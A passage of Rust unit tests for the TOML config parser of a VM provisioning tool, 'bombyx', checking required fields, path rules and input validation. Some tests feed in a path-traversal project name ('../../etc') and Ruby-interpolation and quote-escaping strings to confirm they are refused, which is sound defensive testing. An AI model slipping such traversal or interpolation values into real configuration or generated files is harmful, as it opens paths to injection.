        src
    }

    #[test]
    fn every_vm_and_source_field_is_required() {
        // A table present but incomplete must be an error, not
        // a VM built from a mix of stated and invented values.
        // Nothing enforces this except every field of `Vm` and
        // `Source` being required: a `#[serde(default)]` added
        // to one of them later would turn a half-stated table
        // into a silent default, and the operator would read one
        // value in the file while the guest ran with another.
        //
        // Both tables, because the rule protects a required
        // serde field with no default rather than a table name,
        // and `[source]`'s values are the ones reaching `git` on
        // the guest.
        //
        // Each field is omitted in turn rather than testing one
        // partial table, so a failure names the field that
        // stopped being required instead of only reporting that
        // something did.
        //
        // `Config::parse` rather than the `parse` helper: the
        // fixture states both tables, so `completed` would leave
        // it alone, and stating them is the point -- the omission
        // has to be visible in the table the test writes.
        for (_, omitted, _) in TABLE_FIELDS {
            let src = config_without(omitted);
            let err = Config::parse(&src, Path::new("bombyx.toml"), "vmhost")
                .unwrap_err();
            let text = err.to_string();
            assert!(
                matches!(err, ConfigError::Parse { .. }),
                "omitting {omitted}: {text}"
            );
            assert!(
                text.contains("missing field") && text.contains(omitted),
                "omitting {omitted} must be refused by name, got {text}"
            );
        }
    }

    #[test]
    fn rejects_an_unknown_key() {
        // A typo must be reported, not silently defaulted. A
        // silently defaulted key builds the VM to the wrong
        // specification, and the message the operator gets
        // describes the VM rather than the typo.
        let src = "project = \"p\"\n\
                   remote_rot = \"~/vms\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("remote_rot"));
    }

    #[test]
    fn rejects_empty_host() {
        // `--host ""` was typed, so it is reported as an empty
        // field rather than treated as unset.
        let err = parse_with_host("").unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "host" }));
    }

    #[test]
    fn rejects_whitespace_only_project() {
        let src = "project = \"  \"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(err, ConfigError::Empty { field: "project" }));
    }

    #[test]
    fn a_bad_remote_root_in_toml_surfaces_as_a_field_error() {
        // Every `remote_root` rule, and the tests enumerating
        // the family it refuses, live in `config::root`. What
        // this covers is the seam: a value refused there has to
        // come back out of `Config::parse` naming the field, so
        // an operator is told which key to edit.
        for (root, want) in [
            ("", "must not be empty"),
            ("vms", "must start with"),
            ("~vms", "must start with"),
            ("/.", "`.` segment"),
            ("~", "at least 1 directory"),
        ] {
            let src = format!("project = \"p\"\nremote_root = \"{root}\"\n");
            let err = parse(&src).unwrap_err();
            assert!(
                matches!(
                    &err,
                    ConfigError::Empty {
                        field: "remote_root"
                    } | ConfigError::Invalid {
                        field: "remote_root",
                        ..
                    }
                ),
                "remote_root {root:?} must be refused, got {err:?}"
            );
            assert!(err.to_string().contains(want), "{root:?}: {err}");
        }
    }

    #[test]
    fn rejects_a_project_that_is_not_one_segment() {
        let src = "project = \"../../etc\"\n";
        let err = parse(src).unwrap_err();
        assert!(matches!(
            err,
            ConfigError::Invalid {
                field: "project",
                ..
            }
        ));
    }

    #[test]
    fn builds_remote_project_dir() {
        assert_eq!(good().remote_project_dir(), "~/vms/myproject");
    }

    #[test]
    fn remote_project_dir_ignores_trailing_slash() {
        let src = "project = \"p\"\nremote_root = \"/srv/\"\n";
        assert_eq!(parse(src).unwrap().remote_project_dir(), "/srv/p");
    }

    #[test]
    fn scratch_dir_is_scoped_to_the_project() {
        // Without the project segment, `scratch pr-1` from
        // two projects lands in one directory and the second
        // boot overwrites the first's `.vagrant/`.
        assert_eq!(
            good().remote_scratch_dir(&scratch("pr-1234")),
            "~/vms/scratch/myproject/pr-1234"
        );
    }

    #[test]
    fn scratch_dirs_of_two_projects_do_not_collide() {
        let a = good();
        let src = "project = \"ledgerstone\"\n";
        let b = parse(src).unwrap();
        let name = scratch("pr-1");
        assert_ne!(a.remote_scratch_dir(&name), b.remote_scratch_dir(&name));
    }

    #[test]
    fn load_reports_missing_file() {
        let path = Path::new("definitely-not-here-bombyx.toml");
        let err = load(path, &flag_sources("vmhost")).unwrap_err();
        assert!(matches!(err, ConfigError::NotFound(_)));
        assert!(err.to_string().contains("config file not found"));
    }

    #[test]
    fn load_reads_an_existing_file() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bombyx.toml");
        std::fs::write(&path, minimal()).unwrap();
        let cfg = load(&path, &flag_sources("vmhost")).unwrap();
        assert_eq!(cfg.project, "myproject");
    }

    #[test]
    fn load_reports_a_directory_as_not_a_file() {
        // Was a `Read` error carrying whatever the OS said,
        // which differs per platform ("Is a directory" on Unix,
        // "Access is denied" on Windows) and explains nothing.
        // The type check that keeps a symlinked project file
        // from being read answers this case first, and says what
        // is actually wrong.
        let dir = tempfile::tempdir().unwrap();
        let err = load(dir.path(), &flag_sources("vmhost")).unwrap_err();
        assert!(matches!(err, ConfigError::NotAFile(_)), "{err:?}");
    }

    /// A project file carrying every required section.
    ///
    /// Tests that exercise one bad field start from this and
    /// replace a line, so a failure names the field under test
    /// rather than a section someone forgot.
    fn full_toml() -> String {
        // The shared tables with `cpus`/`memory` raised, so a
        // test varying one can tell its value from the default.
        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
            .replace("cpus = 2", "cpus = 4")
            .replace("memory = 2048", "memory = 8192")
    }

    fn parse_full(source: &str) -> Result<Config, ConfigError> {
        Config::parse(source, Path::new("bombyx.toml"), "vmhost")
    }

    #[test]
    fn parses_the_vm_and_source_sections() {
        let cfg = parse_full(&full_toml()).unwrap();
        assert_eq!(cfg.vm.provider, Provider::Libvirt);
        assert_eq!(cfg.vm.box_name, "generic/ubuntu2204");
        assert_eq!(cfg.vm.cpus, 4);
        assert_eq!(cfg.vm.memory, 8192);
        assert_eq!(
            cfg.source.repo.as_str(),
            "https://example.invalid/myproject.git"
        );
        assert_eq!(cfg.source.git_ref, "main");
        assert_eq!(cfg.source.script.as_str(), "vagrant/provision.sh");
    }

    #[test]
    fn requires_both_new_sections() {
        // Neither has a defensible default. A box is the one
        // thing bombyx cannot invent, and a repository bombyx
        // guessed at would be cloned into the guest and run as
        // root.
        //
        // One table removed at a time, and the loop below skips
        // only the named one. Building the input with
        // `take_while` instead would truncate the file at that
        // header, so removing `[vm]` would drop `[source]` too
        // and neither case would be isolated.
        for missing in ["[vm]", "[source]"] {
            let mut source = String::new();
            let mut skipping = false;
            for line in full_toml().lines() {
                if line.starts_with('[') {
                    skipping = line.starts_with(missing);
                }
                if !skipping {
                    source.push_str(line);
                    source.push('\n');
                }
            }
            assert!(
                source.contains(if missing == "[vm]" {
                    "[source]"
                } else {
                    "[vm]"
                }),
                "only {missing} may be removed"
            );
            let err = parse_full(&source).unwrap_err();
            assert!(
                matches!(err, ConfigError::Parse { .. }),
                "a file without {missing} must be refused: {err:?}"
            );
        }
    }

    #[test]
    fn rejects_an_unknown_provider() {
        // Failing at parse rather than at boot: an unknown
        // provider renders a Vagrantfile no vagrant can use,
        // and the error would arrive on the VM host after
        // bombyx had already created a directory there.
        let source = full_toml().replace("libvirt", "virtualbox");
        let err = parse_full(&source).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }), "{err:?}");
    }

    #[test]
    fn rejects_a_machine_with_nothing_to_run_on() {
        // One field at a time, so a guard covering only `cpus`
        // cannot pass by way of the `memory` case.
        for (field, from, to) in [
            ("cpus", "cpus = 4", "cpus = 0"),
            ("memory", "memory = 8192", "memory = 0"),
        ] {
            let source = full_toml().replace(from, to);
            let err = parse_full(&source).unwrap_err();
            assert!(
                matches!(&err, ConfigError::Invalid { field: f, .. }
                    if *f == field),
                "{field}: {err:?}"
            );
        }
    }

    #[test]
    fn rejects_characters_that_would_break_the_generated_file() {
        // These four fields are rendered into a Ruby file. The
        // whole family: a quote closes the literal early, a
        // backslash starts an escape, a control character is
        // never meant, and `#{}` is Ruby interpolation, which
        // is evaluated rather than printed.
        for field in ["box", "repo", "ref", "script"] {
            // `{bad:?}` renders a Rust literal, which is a valid
            // TOML basic string for these three. A control
            // character is not: Rust and TOML spell an escape
            // for one differently, so that case would fail as
            // a parse error before reaching the guard. It is
            // covered directly in `config::vm`'s tests instead.
            for (bad, reason) in [
                ("a\"b", "would end or escape"),
                ("a\\b", "would end or escape"),
                ("a#{1}b", "Ruby interpolation"),
            ] {
                let source: String = full_toml()
                    .lines()
                    .map(|l| {
                        if l.starts_with(&format!("{field} = ")) {
                            format!("{field} = {bad:?}\n")
                        } else {
                            format!("{l}\n")
                        }
                    })
                    .collect();
                // The substitution has to have happened, or this
                // loop would assert nothing at all.
                assert!(
                    source.contains(&format!("{field} = ")),
                    "{field} is not a key in the fixture"
                );
                // The message is asserted, not the variant,
                // because the two differ by field. `repo` and
                // `script` are newtypes checked while serde
                // deserializes, so a bad one arrives wrapped as
                // `Parse`, which also names the line. `box` and
                // `ref` are checked after parsing, as `Invalid`.
                // Both spellings carry the field and the reason.
                //
                // The reason has to be asserted as well as the
                // field. `toml` backticks field names in its own
                // messages, so a field-only check also passes on
                // `missing field` or `unknown field` -- and then
                // this test would go green on a fixture that had
                // drifted, while proving nothing about the guard.
                let err = parse_full(&source).unwrap_err().to_string();
                assert!(
                    err.contains(&format!("`{field}`")) && err.contains(reason),
                    "{field} must refuse {bad:?} with {reason:?}, got {err}"
                );
            }
        }
    }
}
